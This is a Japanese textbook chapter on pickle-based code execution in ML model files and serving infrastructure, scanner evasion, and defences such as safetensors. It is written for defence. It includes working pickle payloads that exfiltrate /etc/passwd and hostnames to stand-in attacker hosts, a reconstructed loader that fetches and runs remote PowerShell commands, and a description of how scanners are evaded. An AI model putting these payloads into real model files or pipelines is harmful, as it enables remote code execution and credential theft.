# 第6章 AIサプライチェーン／モデルファイル／MLOpsの脆弱性


## モデルファイルのpickleデシリアライズRCEとsafetensors

機械学習（ML）の世界では、学習済みモデルを「ファイル」として配布・共有するのが当たり前になっている。Hugging Face のようなハブから他人の作った重みをダウンロードし、`torch.load()` や `joblib.load()` の一行で読み込む。この「ダウンロードして読み込むだけ」という何気ない操作こそが、AI システムにおける最も古典的で、しかし今なお現役の遠隔コード実行（RCE：攻撃者が任意のコマンドを標的マシン上で実行できてしまう欠陥）経路である。

本節では、その根源にある Python の **pickle**（オブジェクトをバイト列に変換する標準の直列化＝シリアライズ機構）がなぜコードを実行してしまうのか、検査ツール（picklescan など）がどうやって回避されるのか、そして安全な代替形式 **safetensors** がなぜ安全と言えるのかを、内部の仕組みレベルで解き明かす。防御目的の解説であり、実在サービスや本番環境への無許可の検証、破壊的な手順は扱わない。

### なぜ pickle は「データ」ではなく「プログラム」なのか

まず前提を正しく掴む必要がある。多くの人は「モデルファイルは数値（重み）の塊」だと思っている。ところが PyTorch の従来形式（`.bin` / `.pt` / `.pth`）や scikit-learn の保存形式は、その内部で pickle を使っている。そして pickle は JSON のような「純粋なデータ形式」ではない。

pickle の実体は、**スタックベースの仮想マシン（VM）に対する命令列（opcode＝オペコード、1バイト単位の実行命令）**である。`pickle.loads()` を呼ぶと、Python はそのバイト列を先頭から読み、opcode を1つずつ解釈してオブジェクトを「再構築」する。つまりロード処理は、単にメモリへ数値をコピーするのではなく、**ファイルに書かれた命令を実行するインタプリタ**として動作する。ここが JSON との決定的な差である。JSON パーサは値を組み立てるだけで、関数を呼ぶ手段を一切持たない。pickle は持っている。

> Python's pickle module serializes arbitrary Python objects through a stack-based virtual machine. Unlike JSON, pickle can encode execution instructions.
>
> 出典: AFINE — Pickle Deserialization in ML Pipelines: The RCE That Won't Go Away — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away

### 攻撃の核心：`__reduce__` メソッド

pickle が任意のコードを実行できてしまう入口は、`__reduce__` という特殊メソッドにある。

Python のオブジェクトを pickle 化するとき、pickle は対象オブジェクトに `__reduce__()` があればそれを呼び、「**復元に使う callable（呼び出し可能オブジェクト＝関数など）と、その引数のタプル**」を受け取る。デシリアライズ時には、pickle はこのタプルを見て「その callable を、その引数で呼び出せば元のオブジェクトが再構築できる」と解釈し、実際に呼び出す。

本来これは「複雑なオブジェクトを復元する正当な仕組み」だが、`__reduce__` が返す callable を `os.system` のような危険な関数にすり替えれば、ロードした瞬間に任意コマンドが走る。

```python
import os
import pickle

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker.example/exfil?h=$(hostname) -d @/etc/passwd",))

payload = pickle.dumps(MaliciousPayload())
```

この `payload` を誰かが `pickle.loads()` すると、`os.system("curl ...")` が **モデルオブジェクトが呼び出し元へ返る前に**実行される。つまり「モデルを読み込んだだけ」で、ロード処理を走らせたプロセスの権限のまま、ホスト名や `/etc/passwd` を外部へ送り出す（情報窃取）ことができてしまう。

> The payload executes with the deserializing service's privileges before returning a model object to the caller.
>
> 出典: AFINE — Pickle Deserialization in ML Pipelines: The RCE That Won't Go Away — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away

Egnworks の解説は、この性質を「バグではなく仕様どおりの動作」と的確に表現している。メモリ破壊もパースの不具合も必要ない。**ローダは pickle が設計どおりに行うことを、そのまま行っているだけ**である。

```python
import os
import pickle

class Probe:
    def __reduce__(self):
        return (os.system, ("id; curl http://attacker.host/$(hostname)",))

with open("pytorch_model.bin", "wb") as out:
    pickle.dump(Probe(), out)
```

ファイル名が `pytorch_model.bin` である点に注目してほしい。中身は「一見ふつうの PyTorch モデル」だが、開いた（ロードした）瞬間にシェルコマンドが走る。攻撃には解析上の欠陥（parsing bug）もメモリ破壊も要らない。

> This payload executes shell commands when the file loads, requiring no parsing bugs or memory corruption—"the loader does exactly what pickle is designed to do."
>
> 出典: Egnworks — Pickle Deserialization RCE: How a Malicious AI Model Runs Code the Moment You Load It — https://www.egnworks.com/blog/pickle-deserialization-rce-how-a-malicious-ai-model-runs-code-the-moment-you-load-it/

Hugging Face のブログも同じ仕組みを、より簡潔な「PoC（概念実証）」で示している。`os.system` の引数を `touch /tmp/pwned_from_pickle` のような無害な観測用コマンドにすれば、実行が起きたことをファイルの有無で確認できる。

```python
class RCE:
    def __reduce__(self):
        return (os.system, ("touch /tmp/pwned_from_pickle",))

payload = pickle.dumps(RCE())
```

さらに Hugging Face の記事は、ML 特有の「危険な受け口（sink＝入力が最終的に実行・解釈される危険な代入先）」を挙げている。LLM の応答、クラウドストレージ、メッセージキューといった**信頼できない入力を直接 `pickle.loads()` に渡すパターン**である。

```python
def restore_agent_state(state_blob: bytes):
    state = pickle.loads(state_blob)   # 信頼できないバイト列がそのまま sink へ
    return state
```

エージェント（自律的にツールを呼ぶ LLM アプリ）が「状態（state）」を pickle で保存・復元する設計は珍しくない。その `state_blob` が外部から供給されうるなら、それはそのまま RCE 経路になる。

> Direct use of `pickle.loads()` on untrusted input from LLM responses, cloud storage, or message queues creates vulnerability windows.
>
> 出典: Hugging Face Blog — AI for Organizations 2: Risk of Pickle — https://huggingface.co/blog/huseyingulsin/ai-for-organizations-2-risk-of-pickle

### NumPy 経由の見落とされがちな経路

pickle の危険は PyTorch だけの話ではない。NumPy の `np.load()` は、`allow_pickle=True` を指定すると配列の中に埋め込まれた pickle オブジェクトを復元する。ML パイプラインで「モデルや前処理器を `.npy` で保存・配布」している場合、次のようなローダは静かな攻撃経路になる。

```python
def load_model(model):
    return np.load(model, encoding="latin1", fix_imports=True, allow_pickle=1)
```

`allow_pickle=1`（= True）が付いている限り、`.npy` ファイルの中の悪意ある `__reduce__` がロード時に発火する。NumPy がバージョンによって `allow_pickle` の既定値を False に変えたのは、まさにこのリスクを封じるためである。**「pickle を許可する引数」を安易に True にしない**、という原則がここでも効く。

> 出典: SecDim — LLM to RCE using broken pickles — https://secdim.com/blog/post/llm-to-rce-using-broken-pickles-9359/

### 検査ツール picklescan と、その「壊れた pickle」による回避

pickle が危険だと分かっているなら、「ロード前に中身を検査すればよい」と考えるのが自然だ。実際、Hugging Face は modelscan / picklescan といったツールでアップロードされたファイルを走査し、危険な global（`os.system` のような外部関数の参照）を検出しようとする。

```bash
pip install picklescan
picklescan --huggingface ykilcher/totally-harmless-model
```

**picklescan の原理**：pickle を実際に実行（unpickle）するのではなく、opcode 列だけを走査し、`GLOBAL` / `STACK_GLOBAL`（外部のモジュール・関数をスタックに載せる opcode）で参照されるシンボルを、危険関数のブラックリスト（`posix system`、`os.system`、`subprocess` など）と突き合わせる。正しく作られた RCE ペイロードなら opcode 列のどこかに `"posix system"` が現れるので、検出できるはずである。

> **How picklescan works:** It compares opcodes against a blacklist of dangerous functions. ... a properly constructed exploit contains `"posix system"` which should trigger detection.
>
> 出典: SecDim — LLM to RCE using broken pickles — https://secdim.com/blog/post/llm-to-rce-using-broken-pickles-9359/

#### 「壊れた pickle（broken pickle）」による回避の仕組み

SecDim の記事が示す回避テクニックの肝は、**pickle を「わざと壊す」こと**にある。pickle のバイト列は最後に `.`（STOP opcode、16進で `2e`）で終わる。攻撃者は STOP opcode の直前に**不正な（余分な）バイトを挿入**して、パーサから見ると「途中で破綻したファイル」を作る。

```
正常な終端: ...71161747112622   （valid pickle）
壊した終端: ...71161747112582e   （58 と 2e を追加して壊す）
```

なぜこれで回避できるのか。ポイントは **picklescan の走査ループと、Python 本体の unpickle の「実行順序」の違い**である。

- 旧バージョンの picklescan（**バージョン 0.0.18 以前**）は、opcode を順に読む途中で不正バイトに出くわすと**例外を投げてループを中断**していた。危険な opcode が壊れた箇所より後ろにあれば、そこへ辿り着く前に走査が止まり、**「危険なし」と誤判定**される。
- 一方、実際にファイルをロードする側（`pickle.loads()`）は、**危険な `REDUCE`（callable を引数で呼び出す opcode）を先に実行してしまってから**、最後の壊れた部分で例外になる。つまり「例外が出た＝失敗」に見えても、**例外が起きる前に悪意あるコードは既に実行済み**なのだ。

> Despite scan failures, the exploit executed successfully because the exception occurred *after* malicious code executed during the initial unpickling attempt.
>
> 出典: SecDim — LLM to RCE using broken pickles — https://secdim.com/blog/post/llm-to-rce-using-broken-pickles-9359/

これは検査ツール全般に通じる普遍的な教訓である。**「検査器が安全にパースできるもの」と「実行器が実際に実行するもの」は同一ではない**。両者の解釈の差（パーサ差異）がある限り、片方をすり抜けてもう片方で発火するペイロードが作れる。

#### picklescan 側の修正と、それでも残る限界

現在の picklescan は、例外が起きても**走査を止めずに続行**するよう改善され、この「壊れた pickle」パターンでも危険な import を検出できるようになった（対象：修正後バージョン）。

しかし「パターンマッチによる検査」という手法そのものに構造的な限界がある。AFINE の記事は、2025 年時点で複数の回避 CVE が報告されたことを整理している。

- **Sonatype** が picklescan に対し、ZIP のフラグビット操作や非標準拡張子を悪用してブラックリストを回避する **4 件の CVE** を発見。
- **JFrog** が独立に **3 件のゼロデイ**を発見。
- 学術研究は Python 標準ライブラリ内に「**133 個の悪用可能な function gadget（部品として悪用できる正規関数）**」を特定し、現行スキャナに対し「**ほぼ 100% の回避率**」を達成したと報告。

> The fundamental issue: pickle's Turing-completeness makes pattern-based detection inherently fragile.
>
> 出典: AFINE — Pickle Deserialization in ML Pipelines: The RCE That Won't Go Away — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away

pickle は**チューリング完全**（任意の計算を表現できる）なので、危険関数を「直接名指し」せずとも、無害に見える標準関数を組み合わせて同じ効果を作れる。したがって「危険な名前を探す」ブラックリスト方式は原理的に破られやすい。AFINE はさらに、Brown 大学の 2025 年の調査で「Hugging Face の人気リポジトリの約半数が依然として pickle モデルを含む」こと、そして「5 大 ML フレームワークにまたがる 22 種類の pickle ロード経路のうち 19 種類を既存スキャナが見落としていた」ことを紹介している。

### 検査すべきは「ファイル単体」だけではない：サービス基盤の pickle 経路

pickle RCE は「悪意あるモデルファイルを掴まされる」ケースだけではない。**LLM の配信・推論基盤（serving infrastructure）が、ネットワーク越しの通信に pickle を使っている**と、モデルが正規でもサービス全体が乗っ取られる。AFINE と Egnworks が挙げる代表例が **vLLM の CVE-2025-32444** である。

#### vLLM CVE-2025-32444（CVSS 10.0：最高深刻度）

vLLM は高スループットな LLM 推論サーバである。その **Mooncake 連携**機能が、**ZeroMQ（軽量メッセージングライブラリ）ソケットを `0.0.0.0`（全ネットワークインタフェース）にバインドし、認証なしで** `recv_pyobj()` を呼んでいた。`recv_pyobj()` は受信したバイト列を内部で pickle デシリアライズする関数である。

つまり、そのソケットに到達できる**ネットワーク上の任意のホストが、悪意ある pickle を送りつけるだけで RCE を達成**できた。モデルファイルの善し悪しは無関係で、通信路そのものが `pickle.loads()` の sink になっていたわけである。CVSS 10.0 という最高スコアは、認証不要・ネットワーク到達可能・完全な権限奪取という三拍子を反映している。

> **vLLM CVE-2025-32444 (CVSS 10.0):** The Mooncake integration used `recv_pyobj()` on ZeroMQ sockets bound to `0.0.0.0` without authentication. Any network host could connect and achieve RCE.
>
> 出典: AFINE — Pickle Deserialization in ML Pipelines: The RCE That Won't Go Away — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away

同種の欠陥は他の基盤にも広がっている。

- **LightLLM CVE-2026-26220（2026 年 2 月）**：prefill-decode 分離システムの WebSocket エンドポイントが、受信フレームを `pickle.loads()` に直接渡していた。しかも nonce（使い捨ての認証用ランダム値）ベースの認証が**既定で空文字列**になっており、チェックが実質無効化されていた。

```python
data = await websocket.receive_bytes()
obj = pickle.loads(data)   # 信頼できない WebSocket バイナリフレームを直接 unpickle
```

- **manga-image-translator CVE-2026-26215**：同様の pickle ベース RCE。
- **Hugging Face LeRobot CVE-2026-25874（CVSS 8.8）**：gRPC 越しの pickle デシリアライズを、送信元検証なしで行っていた（Egnworks が言及）。

これらに共通する構造は、「**内部通信だから信頼できる**」という暗黙の前提のもとで pickle を使い、そこへネットワーク経由で untrusted なデータが流れ込む、という点である。

> 出典: AFINE — Pickle Deserialization in ML Pipelines: The RCE That Won't Go Away — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away ／ Egnworks — Pickle Deserialization RCE — https://www.egnworks.com/blog/pickle-deserialization-rce-how-a-malicious-ai-model-runs-code-the-moment-you-load-it/

#### 現実の攻撃事例

理論だけの話ではない。SecDim・SecDim 参照の報告によれば、**2025 年 2 月に Reverse Engineering Labs（ReversingLabs）が Hugging Face 上で悪意あるモデルを発見**した。これらは本節で解説した「壊れた pickle」テクニックを使ってスキャナを回避し、ロード時にリバースシェル（攻撃者へ接続を張り返して遠隔操作を許す仕掛け）を張るよう作られていた。

> In February 2025, Reverse Engineering Labs identified malicious models on Hugging Face exploiting these techniques, designed to execute reverse shells granting unauthorized system access.
>
> 出典: SecDim — LLM to RCE using broken pickles — https://secdim.com/blog/post/llm-to-rce-using-broken-pickles-9359/

### 防御 1：`weights_only` で pickle の「実行能力」を封じる

もし pickle 形式を使い続けざるを得ないなら、まず打つべき手が PyTorch の **`weights_only=True`** である。

PyTorch は **バージョン 2.0** で `torch.load()` に `weights_only` 引数を導入した（そして後のバージョンでは既定値が `True` へ移行している。使用中のバージョンで明示指定するのが確実）。これを True にすると、unpickle 時に**テンソル復元に必要な安全な opcode / global だけを許可リストで通し、`os.system` のような任意 callable の呼び出しを拒否**する。

```python
# 危険：無制限に pickle をデシリアライズする
model.load_state_dict(torch.load("checkpoint.pt"))

# 安全側：テンソル関連の opcode のみを許可
model.load_state_dict(torch.load("checkpoint.pt", weights_only=True))
```

なぜ効くのか。前述のとおり RCE は `REDUCE` opcode が任意の callable を呼ぶことに由来する。`weights_only=True` は、この「任意 callable 呼び出し」を許可リスト外として遮断し、実質的に pickle VM の「プログラム実行能力」を奪う。ただし、独自クラスを含むモデルはロードできなくなる場合があり、また過去には許可リスト自体の回避が議論されたこともある。**あくまで多層防御の一枚**として位置づけるのが正しい。

> Before version 2.0, `torch.load(path)` performed unrestricted pickle deserialization. PyTorch 2.0 introduced `weights_only=True` parameter
>
> 出典: AFINE — Pickle Deserialization in ML Pipelines: The RCE That Won't Go Away — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away

### 防御 2：本命は safetensors への移行

最も根本的な対策は、**そもそもコードを実行できない形式に移す**ことである。それが Hugging Face が開発した **safetensors** である。

#### safetensors がなぜ安全なのか（フォーマット内部）

safetensors のファイル構造は極めて単純で、次の要素しか持たない。

1. 先頭 **8 バイト**：後続する **JSON ヘッダの長さ**（バイト数）を示すリトルエンディアン整数。
2. **JSON ヘッダ**：各テンソルの名前・データ型（dtype）・形状（shape）・データ本体の**バイトオフセット**を記述したメタデータ。
3. **生のバイナリ**：テンソルの数値データそのもの。

重要なのは、この形式には **callable を参照する仕組みも、命令（opcode）を実行する VM も一切存在しない**という点である。ロード処理がやれることは「**JSON で示された位置から数値をメモリへコピーする**」だけで、それ以上でも以下でもない。pickle が「命令列を実行するインタプリタ」だったのに対し、safetensors ローダは「数値をコピーする単純な読み取り機」に過ぎない。だから設計上 RCE が起こりえない。

> Safetensors stores "tensors and metadata only" with "no mechanism to call code." Loading it "can copy numbers into memory and nothing else."
>
> 出典: Egnworks — Pickle Deserialization RCE — https://www.egnworks.com/blog/pickle-deserialization-rce-how-a-malicious-ai-model-runs-code-the-moment-you-load-it/

```python
from safetensors.torch import load_file

state = load_file("model.safetensors")
```

Hugging Face のブログも同様に、safetensors は「8 バイトのヘッダに JSON のテンソルメタデータ、その後に生のバイナリデータ」という構成であり、pickle のようなコード実行能力を持たないため「安全なモデル利用に関する懸念を解消する」と述べている。safetensors は Hugging Face のエコシステムで既定形式として推進されており（記事は 2022 年以降の既定化に言及）、多くの人気モデルが `.safetensors` を併配布している。

> 出典: Hugging Face Blog — AI for Organizations 2: Risk of Pickle — https://huggingface.co/blog/huseyingulsin/ai-for-organizations-2-risk-of-pickle

なお、用途に応じた「pickle を使わない代替」は他にもある。AFINE は、計算グラフの受け渡しには **ONNX**、プロセス間通信（IPC）には **MessagePack** を推奨し、テンソル重みは safetensors に寄せる、という使い分けを挙げている。

### 防御 3：ロード前スキャンとハッシュ検証（多層防御）

形式移行が完了するまでの間、あるいは外部モデルを受け入れる境界では、以下を組み合わせる。

#### ロード前スキャン（fickling / picklescan / modelscan）

`pickle.loads()` を呼ぶ**前に**、opcode 列を静的に解析して危険な import を洗い出す。Egnworks は `fickling` の利用を挙げている。

```bash
fickling --check-safety pytorch_model.bin
```

これは `os` や `subprocess` といった実行プリミティブ（コマンド実行の原始的手段）の import を検出して警告する。ただし前述のとおり、スキャナは「壊れた pickle」や gadget 連鎖で回避されうるため、**これ単独を最終防御にしてはならない**。CI/CD で `.bin` / `.pkl` / `.pt` を必ず走査し、危険判定が出たらパイプラインを止めて隔離（quarantine）する運用と組み合わせる。

#### ハッシュ検証（最低限の防御）

配布元で計算した SHA-256 と、手元で読み込むファイルのハッシュを突き合わせ、一致しなければロードしない。改ざんされた（＝別物の）ファイルを掴まされる事故を防ぐ、最も安価な一枚である。

```python
import hashlib
import pickle

def load_verified_model(path, expected_sha256):
    with open(path, "rb") as f:
        data = f.read()
    actual = hashlib.sha256(data).hexdigest()
    if actual != expected_sha256:
        raise ValueError(f"Model file hash mismatch: {actual}")
    return pickle.loads(data)
```

注意：ハッシュ検証は「**期待どおりのファイルか**」を保証するだけで、「**そのファイル自体が安全か**」は保証しない。悪意ある pickle でもハッシュは一致する。あくまで改ざん検知であって、内容の無害性検証ではない。

> 出典: AFINE — Pickle Deserialization in ML Pipelines — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away ／ Egnworks — Pickle Deserialization RCE — https://www.egnworks.com/blog/pickle-deserialization-rce-how-a-malicious-ai-model-runs-code-the-moment-you-load-it/

#### 検知（ロード後の異常監視）

万一を想定し、SIEM（セキュリティ監視基盤）で「**モデルファイルを開いた直後に Python プロセスがシェルやネットワークツールを spawn（起動）した**」という振る舞いを検知するルールを置く。Egnworks が推奨するこの post-load 検知は、事前スキャンをすり抜けた攻撃を実行時に捕捉する最後の網である。

### 根本原因と、組織としての向き合い方

AFINE はこの問題の本質を一言でまとめている。「**脆弱性はコードではなくデータの中にある（The vulnerability is in the data, not the code）**」。ローダのソースコードをいくら静的解析しても、実行時に読み込む「ファイルの中身」を見なければ危険は判定できない。しかも中身の pickle はチューリング完全なので、完全な事前判定は原理的に困難である。

したがって、単発のツール導入では足りない。研究コミュニティは、ライブラリごとに「許可する復元手続き」をホワイトリスト化する **PickleBall（CCS 2025）** のような、より厳密なアプローチも提案している。実務としては次の優先順位が現実的だ。

1. **可能な限り safetensors（重み）／ONNX（グラフ）／MessagePack（IPC）へ移行**し、pickle の実行能力を土台から排除する。
2. pickle が残る箇所は **`weights_only=True`** を明示し、任意 callable の呼び出しを封じる。
3. 外部由来のモデル・通信は**ロード前スキャン＋ハッシュ検証＋信頼リポジトリのホワイトリスト**で境界を固め、サンドボックスで先行検証する。
4. **推論基盤の内部通信（ZeroMQ / WebSocket / gRPC）が pickle を使っていないか**を棚卸しし、認証とバインド先（`0.0.0.0` に晒していないか）を点検する。vLLM CVE-2025-32444 が示したのは、モデルではなく「基盤の通信路」が最悪の穴になりうるという事実である。
5. 学習時にモデルへ**署名**し、鍵管理を分離して来歴（provenance）を保証する。

> The organizational gap: ML teams lack systematic security thinking about model artifact lifecycles and serving infrastructure.
>
> 出典: AFINE — Pickle Deserialization in ML Pipelines: The RCE That Won't Go Away — https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away

### まとめ

- pickle は「データ形式」ではなく「命令列を実行する VM」であり、`__reduce__` が返す callable をロード時に呼ぶため、モデルを**読み込んだだけで RCE** が成立する。
- 検査ツール（picklescan など）は「壊れた pickle」や gadget 連鎖で回避されうる。**スキャナが安全にパースできる範囲と、実行器が実際に実行する範囲のズレ**が回避の温床になる。旧 picklescan（0.0.18 以前）は例外でループ中断する挙動を突かれた。
- 危険はファイル単体に留まらない。**vLLM CVE-2025-32444（CVSS 10.0）**のように、推論基盤が認証なしのネットワーク通信で pickle をデシリアライズしていれば、正規モデルでもサービスが乗っ取られる。
- 最終解は **safetensors**（コード実行機構を持たない「数値コピー専用」形式）への移行。過渡期は **`weights_only=True`**、ロード前スキャン、ハッシュ検証、通信路の点検を多層に重ねる。

## モデルハブのサプライチェーンリスクとMLコードの安全性

機械学習システムは「コードの脆弱性」だけでなく、「学習済みモデルという“実行可能なデータ”」を外部から取り込むという特殊なサプライチェーンを持つ。npm・PyPIのようなパッケージレジストリと同様に、Hugging Face Hubのようなモデルハブは誰でもアップロードできるオープンなエコシステムであり、モデルファイル自体がコード実行のベクタになり得る。本節では、(1) モデルファイルのシリアライゼーション形式に起因する脆弱性とその検出回避手法、(2) MLOpsパイプライン全体に対する脅威モデル、(3) 学習コード自体に潜む脆弱性パターンという3つの観点から、モデルハブ／MLコードのサプライチェーンリスクを整理する。読者が想定する対策は一貫して**防御目的**であり、実在サービスへの無許可の検証は行わない前提で解説する。

### なぜモデルファイルは「危険なデータ」になり得るのか

PyTorchの標準的なモデル保存形式は、内部的にPythonの`pickle`プロトコルを使用する。pickleは本来「任意のPythonオブジェクトをバイト列に直列化・復元する」ための汎用フォーマットであり、その復元（デシリアライゼーション）処理はPythonのバイトコードに相当する**opcode列を解釈実行する仮想マシン**として動作する。pickleのopcodeには`REDUCE`（任意の呼び出し可能オブジェクトを引数付きで呼び出す）のような命令が含まれており、これを悪用すると「モデルファイルを読み込んだ瞬間に任意のPythonコード（延いてはOSコマンド）が実行される」という古典的な安全でないデシリアライゼーション（insecure deserialization）が成立する。

つまり、`model.pt`のような「ただの重みファイル」に見えるものが、実態は「Pythonの実行可能ペイロードを含みうるコンテナ」なのである。これはJavaのシリアライズオブジェクトやPHPの`unserialize()`と本質的に同じ脆弱性クラスであり、MLエコシステム特有の事情として「巨大なバイナリファイルの中身を人間がレビューすることは事実上不可能」という点が被害を拡大させる。

```python
# 危険側: torch 2.6より前のデフォルト挙動
model = torch.load("model.pt")  # pickle経由で任意オブジェクトを復元しうる

# 緩和策: 重みとしてホワイトリストされた型のみ復元
model = torch.load("model.pt", weights_only=True)

# 根本対策: そもそも実行可能コードを埋め込めない形式を使う
from safetensors.torch import load_file
tensors = load_file("model.safetensors")
```

`weights_only=True`はPyTorch側が2023年以降に追加した緩和策で、復元対象をテンソルなど安全な型のホワイトリストに限定することで`REDUCE`のような任意呼び出しを禁止する。さらに根本的な対策が`safetensors`形式であり、これはGoogle/Hugging Faceが共同で設計した「ヘッダ（メタデータのJSON）＋生のテンソルバイト列」という単純な構造を持ち、**デシリアライズ時にコードを一切解釈しない**ため、pickleに起因するクラスの脆弱性がプロトコルレベルで存在しない。

> 出典: Hive Security — Hugging Face AI Supply Chain Attacks — https://hivesecurity.gitlab.io/blog/huggingface-ai-supply-chain-attacks-2026/

### nullifAI: モデルハブのスキャナを迂回する手口（2026年事例）

Hugging Face Hubは、アップロードされたモデルファイルに対して`Picklescan`のような静的スキャナを自動実行し、危険なopcode（`os.system`や`subprocess`の呼び出しなど）を検出してユーザーに警告する仕組みを持つ。しかし、ReversingLabsが報告した通称「nullifAI」と呼ばれる手法は、この防御を単純なトリックで無効化した。

**仕組み**: PyTorchが標準的に使用するモデルのコンテナ形式はZIPアーカイブである。多くのスキャナはこの「ZIP形式のpickleファイル」という前提でパーサを実装している。nullifAI攻撃では、モデルを**PyTorchが読めるpickle構造のまま、コンテナだけを7z圧縮に差し替える**ことで、スキャナのパーサがファイルを正しく認識できずに解析をスキップ（＝安全と誤判定、あるいは単に処理失敗として素通り）する一方、ランタイム側（悪意ある独自ローダーコード）は問題なく展開・実行できるというギャップを突いた。

これは「パーサ差分攻撃（parser differential attack）」の典型例であり、原理としては「検査を行うプログラムA（スキャナ）」と「実際に処理を行うプログラムB（PyTorchランタイムや悪意あるローダー）」が、同じ入力に対して異なる解釈をする場合に、その差分が攻撃面になるという一般則に基づく。HTTPリクエストスマグリングやXML外部実体参照の文脈で頻出する構図が、モデルファイルという別のレイヤーでも再現された形だ。

実際の攻撃キャンペーンでは、以下のような難読化・検出回避テクニックが組み合わされていたと報告されている。

```python
# 攻撃者が仕込んだローダーコードの構造（再構成例）
import subprocess, base64, requests, ssl

# プロキシ/企業のSSL中間者検査による通信内容の可視化を回避
ssl._create_default_https_context = ssl._create_unverified_context

# URLを直接文字列で書かず、静的スキャンでの文字列マッチ検出を回避
url = base64.b64decode("aHR0cHM6Ly8...").decode()

# コマンド自体はディスクに書き込まず、都度リモートから取得して実行
# → ファイルベースのマルウェア対策（AV/EDRのファイルスキャン）に痕跡を残しにくい
cmd = requests.get(url).json()["cmd"]
subprocess.run(["powershell", "-Command", cmd])
```

この構造が危険な理由は次の3点に整理できる。

1. **Base64エンコード**によりURL文字列が静的解析での単純な文字列一致・正規表現検出をすり抜ける。
2. **リモートからのコマンド取得（fetch-then-execute）**により、ペイロード本体がモデルファイル自体には含まれず、実行時に初めて外部から取得される。これによりモデルファイルの静的スキャンでは「何が実行されるか」が原理的に判定不能になる。
3. **SSL検証無効化**は、企業ネットワークでのTLS中間者インスペクション（プロキシによる復号・検査）を想定した回避策であり、通信内容の可視化を妨げる。

実装されていたInfostealer機能は、ブラウザに保存されたCookie・パスワード・閲覧履歴、Discordトークン、暗号資産ウォレット、FileZillaの認証情報、スクリーンショットの窃取など多岐にわたる。

**被害規模**として、悪質モデルを配布したアカウントの1リポジトリ（`Open-OSS/privacy-filter`という名称が使われた例）だけで18時間の間に約244,000ダウンロード・667いいねを記録し、同一アカウントから関連リポジトリが6個追加で検出された（2026年4月24日アップロード分）。またサプライチェーン汚染は「AIエージェント向けスキル配布」の領域にも及び、ClawHub上で341個の悪質スキル（うち335個は単一キャンペーンに由来）が確認された。さらに周辺事例として、LiteLLMパッケージの侵害により最大50万件規模の認証情報が露出しうる状況も報告されている。

### 防御策: モデルの取り込みを「信頼できない入力の受け入れ」として扱う

pickleベースの脅威に対する防御は、Webアプリケーションにおける「信頼できない入力の検証」と同じ発想で整理できる。

**個人・チーム開発者向け:**

- 可能な限り`safetensors`形式のモデルへ移行する。pickleに依存する形式（`.pt`, `.pth`, `.ckpt`など）はコード実行のリスクを内包していると理解する。
- モデルを参照する際は「`organization/model-name`」のようなミュータブルな名前ではなく、**検証済みのコミットSHA（ハッシュ）でピン止め**する。名前ベースの参照は、後から同名のリポジトリ内容が差し替えられる「TOCTOU（Time-of-check to time-of-use）」的な差し替え攻撃に弱い。
- `trust_remote_code=True`（Hugging Face Transformersなどでリポジトリ同梱のカスタムPythonコードの実行を許可するオプション）を安易に使わない。使う場合はコードの内容を必ず監査する。

**組織向け:**

- 外部モデルハブを直接プロダクション環境に接続せず、**内部モデルレジストリにミラーリング**してから利用する（承認済みモデルのみを内部から配布する構成）。
- モデルの読み込みはネットワークアクセスを遮断した隔離コンテナ（サンドボックス）内で行い、仮に悪意あるコードが実行されても外部への通信・データ持ち出しができない状態にする。
- MLワークロードのネットワーク活動を監視し、pastebin.com等の外部データ交換サービスへの予期しない接続を検知する。

これらの対策思想は、記事が結論として述べる「npmエコシステムが数年かけて学んだサプライチェーンセキュリティの教訓を、AI/MLエコシステムはわずか数ヶ月で繰り返している」という指摘に集約される。パッケージ名の乗っ取り、タイポスクワッティング、検出回避のための難読化——これらはすべてソフトウェアサプライチェーン攻撃で既知のパターンであり、モデルハブという新しい配布経路に同じ攻撃が移植されているに過ぎない。

> 出典: Hive Security — Hugging Face AI Supply Chain Attacks — https://hivesecurity.gitlab.io/blog/huggingface-ai-supply-chain-attacks-2026/

### MLOpsパイプライン全体を俯瞰した脅威モデル（Trail of Bits）

モデルファイル単体の脆弱性は「サプライチェーン攻撃面」の一部に過ぎない。Trail of BitsはAI/MLシステムのセキュリティ評価を、学習データからMLOpsパイプライン、モデルアーティファクト、推論を行うハードウェア、さらにはデプロイされたAIエージェントのループに至るまで、**エンドツーエンド**で捉えるアプローチを取っている。この観点は、教科書としてMLシステムのどこに攻撃面があるかを俯瞰する上で有用な整理軸になる。

#### 1. MLOpsパイプラインとサプライチェーン

CI/CDプロセスそのもの（学習ジョブのトリガー、依存関係の取得、成果物の公開までの自動化パイプライン）と、学習に使われたデータの出所（データプロベナンス）が評価対象となる。ここでの考え方は通常のソフトウェアサプライチェーンセキュリティ（SLSAのようなフレームワークが扱う領域）とほぼ同一で、「どの入力が、どの工程を経て、どのように成果物になったか」を追跡可能にすることが防御の基本になる。加えて、GPUなどの推論・学習ハードウェアスタック自体のセキュリティ評価も含まれる点は、MLシステム特有の観点である。

#### 2. モデルアーティファクトの検査

PyTorchのようなML基盤ソフトウェア自体、あるいは`safetensors`のような新しいシリアライゼーション形式についても、Trail of Bitsはセキュリティレビューを実施している。これは「安全なはずの代替フォーマットであっても、その実装自体にバグがないかは別途検証が必要」という、暗号ライブラリの実装レビューと同種の慎重さを示している。

#### 3. エージェント・モデルに対する脅威

プロンプトインジェクション、データ流出、推論操作（モデルの出力を意図的に誤らせる攻撃）、機能悪用の検証も評価範囲に含まれる。攻撃的・防御的なML能力をベースラインと比較評価するプロセスも実施される。

#### 使用ツール・手法

- **fickling**: pickleファイルの静的解析・安全性検査ツール（Trail of Bitsが公開しているOSSで、pickle opcode列を人間が読める形に逆コンパイルし、危険な呼び出しを検出する）。本節で扱ったpickleベースの脅威に対する実践的な検査手段として位置づけられる。
- **Semgrep/CodeQLのカスタムルール**: CI/CDに統合可能な静的解析ルールをML特化で整備し、リポジトリの継続的な検査に組み込む。
- **Buttercup**: DARPAのAIxCC（AI Cyber Challenge）向けに開発された自動脆弱性検出・修正システム。
